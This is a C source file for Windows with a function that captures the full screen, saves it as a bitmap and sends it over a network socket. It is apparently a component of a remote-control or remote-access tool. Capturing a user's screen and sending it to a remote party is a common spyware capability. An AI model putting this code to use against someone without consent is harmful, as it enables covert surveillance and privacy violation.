#include <stdlib.h>
#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <mswsock.h>
#include <windows.h>
#include "screenshot.h"

BYTE* read_file(char* path, long* fileLength) {
  FILE *file = fopen(path, "rb+");
  fseek(file, 0, SEEK_END);
  *fileLength = ftell(file);
  fseek(file, 0, SEEK_SET);
  BYTE* fileBuffer = (BYTE*)malloc(sizeof(BYTE) * *fileLength);
  fread(fileBuffer, sizeof(BYTE), *fileLength, file);
  fclose(file);

  return fileBuffer;
}

void get_screen_size(long* x, long* y) {
  DEVMODE dm;
  dm.dmSize = sizeof(dm);

  EnumDisplaySettings(0, ENUM_CURRENT_SETTINGS, &dm);

  *x = (long)dm.dmPelsWidth;
  *y = (long)dm.dmPelsHeight;
}

void take_screenshot(char* path, SOCKET sock) {
  long x, y;
  get_screen_size(&x, &y);

  BITMAPFILEHEADER bmfHeader;
  BITMAPINFOHEADER bmiHeader;
  BITMAPINFO bmInfo;

  ZeroMemory(&bmfHeader, sizeof(BITMAPFILEHEADER));
  ZeroMemory(&bmiHeader, sizeof(BITMAPINFOHEADER));
  ZeroMemory(&bmInfo, sizeof(BITMAPINFO));

  bmfHeader.bfType = 0x4d42;
  bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

  bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
  bmiHeader.biWidth = x;
  bmiHeader.biHeight = y;
  bmiHeader.biPlanes = 1;
  bmiHeader.biBitCount = 24;
  bmiHeader.biCompression = BI_RGB;

  bmInfo.bmiHeader = bmiHeader;

  DWORD stride = (bmiHeader.biBitCount * bmiHeader.biWidth + 31 & ~31) / 8 * bmiHeader.biHeight;

  HDC hdc = GetDC(0);
  HDC hdcMem = CreateCompatibleDC(hdc);

  BYTE* dibBytes;
  HBITMAP hbitmap = CreateDIBSection(hdc, &bmInfo, DIB_RGB_COLORS, (void**)&dibBytes, 0, 0);

  HGDIOBJ old = SelectObject(hdcMem, hbitmap);
  BitBlt(hdcMem, 0, 0, x, y, hdc, 0, 0, SRCCOPY);

  HANDLE hfile = CreateFile(path, GENERIC_READ | GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

  BYTE* bmfHeaderBytes = (BYTE*)&bmfHeader;
  BYTE* bmiHeaderBytes = (BYTE*)&bmiHeader;

  DWORD amount;
  WriteFile(hfile, bmfHeaderBytes, sizeof(BITMAPFILEHEADER), &amount, 0);
  WriteFile(hfile, bmiHeaderBytes, sizeof(BITMAPINFOHEADER), &amount, 0);
  WriteFile(hfile, dibBytes, stride, &amount, 0);

  CloseHandle(hfile);

  long imgLen;
  BYTE* read = read_file(path, &imgLen);
  char imgLenBuf[1024];
  sprintf(imgLenBuf, "%ld", imgLen);
  send(sock, imgLenBuf, sizeof(imgLenBuf), 0);

  HANDLE hfile2 = CreateFile(path, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
  TransmitFile(sock, hfile2, 0, 0, 0, 0, 0);
  CloseHandle(hfile2);

  free(read);

  SelectObject(hdcMem, old);
  DeleteDC(hdcMem);
  ReleaseDC(0, hdc);
  DeleteObject(hbitmap);
}